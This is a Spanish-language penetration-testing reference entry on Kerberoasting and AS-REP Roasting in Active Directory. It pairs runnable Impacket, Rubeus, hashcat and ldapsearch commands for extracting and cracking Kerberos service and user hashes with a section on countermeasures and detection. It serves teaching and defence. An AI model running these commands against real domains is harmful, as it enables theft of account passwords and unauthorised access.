---
title: Kerberoasting y AS-REP Roasting
slug: explotacion-kerberoasting
aliases: [Kerberoasting, AS-REP Roasting, ASREPRoast, GetUserSPNs, GetNPUsers, Rubeus kerberoast, TGS roasting, AS-REP cracking]
fase: [Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1558.003, T1558.004]
related: [enumeracion-kerberos, enumeracion-ldap, explotacion-hash-cracking, credential-dumping, golden-ticket, silver-ticket]
learning_refs: []
---

# Kerberoasting y AS-REP Roasting

## Descripción
Dos técnicas hermanas que abusan del protocolo Kerberos para extraer hashes de credenciales de Active Directory que pueden crackearse offline. **Kerberoasting** (T1558.003) explota cualquier cuenta con un Service Principal Name (SPN) registrado: cualquier usuario autenticado del dominio puede solicitar un Ticket Granting Service (TGS) para esa cuenta, y el TGS está cifrado con la clave derivada de la contraseña de la cuenta de servicio. **AS-REP Roasting** (T1558.004) explota cuentas con el flag `DONT_REQ_PREAUTH` (sin pre-autenticación Kerberos): un atacante sin credenciales puede pedir un AS-REP por esa cuenta, y la respuesta contiene un blob cifrado con la clave del usuario. Ambos hashes se crackean offline sin generar ruido en el dominio. La diferencia operacional clave: Kerberoasting requiere credenciales válidas de cualquier usuario del dominio, AS-REP Roasting no requiere ninguna.

## Herramientas
- **Impacket** (`GetUserSPNs.py`, `GetNPUsers.py`) — extracción remota desde Linux con credenciales (Kerberoasting) o sin ellas (AS-REP)
- **Rubeus** (`kerberoast`, `asreproast`) — equivalente nativo en Windows para uso desde una máquina ya comprometida
- **PowerView** (`Get-DomainUser -SPN`, `Invoke-Kerberoast`) — enumeración + roasting integrado en PowerShell
- **hashcat** (modos `13100` para TGS Kerberoast, `18200` para AS-REP) — crackeo offline de los hashes obtenidos
- **john** (formats `krb5tgs`, `krb5asrep`) — alternativa a hashcat con wordlists/rules clásicos

## Comandos / Ejemplos

### Kerberoasting con Impacket (Linux, requiere credenciales del dominio)
```bash
# Listar cuentas con SPN y volcar TGS de cada una
impacket-GetUserSPNs corp.local/lowuser:Password123 -dc-ip 10.10.10.10 -request -outputfile tgs.hash

# Sólo enumerar SPNs sin pedir tickets (más sigiloso)
impacket-GetUserSPNs corp.local/lowuser:Password123 -dc-ip 10.10.10.10

# Usar Kerberos en lugar de NTLM para la autenticación inicial (cuando NTLM está bloqueado)
impacket-GetUserSPNs corp.local/lowuser:Password123 -dc-ip 10.10.10.10 -k -no-pass -request
```

### AS-REP Roasting con Impacket (sin credenciales si la lista de usuarios es conocida)
```bash
# Probar lista de usuarios: los que tengan DONT_REQ_PREAUTH devuelven hash, el resto error
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -format hashcat -outputfile asrep.hash

# Si tenemos credenciales, mejor enumerar las cuentas con DONT_REQ_PREAUTH primero vía LDAP
impacket-GetNPUsers corp.local/lowuser:Password123 -dc-ip 10.10.10.10 -request -format hashcat
```

### Kerberoasting / AS-REP Roasting con Rubeus (Windows, post-acceso a un host del dominio)
```powershell
# Kerberoasting: pedir TGS de todas las cuentas con SPN
Rubeus.exe kerberoast /outfile:tgs.hash /format:hashcat

# Filtrar por cuentas con AES desactivado (más débil, más fácil de crackear)
Rubeus.exe kerberoast /rc4opsec /outfile:tgs.hash

# AS-REP Roasting: cuentas con DONT_REQ_PREAUTH
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash

# Filtrar por OU específica
Rubeus.exe kerberoast /ou:"OU=Servers,DC=corp,DC=local" /outfile:tgs.hash
```

### Crackeo offline con hashcat
```bash
# Kerberoasting TGS (modo 13100)
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# AS-REP Roasting (modo 18200)
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r best64.rule

# Mostrar resultados
hashcat -m 13100 tgs.hash --show
```

### Detección y enumeración de cuentas vulnerables vía LDAP
```bash
# Cuentas con SPN (objetivos Kerberoasting)
ldapsearch -x -H ldap://10.10.10.10 -D 'lowuser@corp.local' -w 'Password123' -b 'DC=corp,DC=local' '(&(objectClass=user)(servicePrincipalName=*))' samaccountname servicePrincipalName

# Cuentas con DONT_REQ_PREAUTH (objetivos AS-REP)
ldapsearch -x -H ldap://10.10.10.10 -D 'lowuser@corp.local' -w 'Password123' -b 'DC=corp,DC=local' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' samaccountname
```

## Contramedidas
- Usar contraseñas largas y aleatorias (≥25 caracteres) para todas las cuentas con SPN; el ataque depende de fuerza bruta offline, no de fallos del protocolo
- Implementar Group Managed Service Accounts (gMSA) con rotación automática (default 30 días, contraseñas de 240 bytes)
- Forzar AES-256 para tickets Kerberos en cuentas críticas, deshabilitando RC4_HMAC en sus propiedades
- Auditar y eliminar el flag `DONT_REQ_PREAUTH` (UAC bit `0x400000`) de cuentas que no lo necesiten
- Monitorear Event ID 4769 (Kerberos Service Ticket Request) con encryption type 0x17 (RC4) — patrón típico de Kerberoasting; un volumen alto desde un mismo principal es señal
- Detectar AS-REP Roasting via Event ID 4768 con campo "Pre-Authentication Type: 0"
- Usar Microsoft Defender for Identity / honeypot accounts con SPNs señuelo: cualquier solicitud de TGS contra esas cuentas es atacante por definición
- Restringir qué cuentas tienen SPNs registrados; muchos DBA/SQL legacy mantienen SPNs sobre cuentas de usuario en lugar de cuentas de servicio dedicadas

## Referencias
- MITRE Corporation. (2024). *ATT&CK Technique T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting*. https://attack.mitre.org/techniques/T1558/003/
- MITRE Corporation. (2024). *ATT&CK Technique T1558.004: Steal or Forge Kerberos Tickets: AS-REP Roasting*. https://attack.mitre.org/techniques/T1558/004/
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- GhostPack. (s.f.). *Rubeus* [Software]. GitHub. https://github.com/GhostPack/Rubeus
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
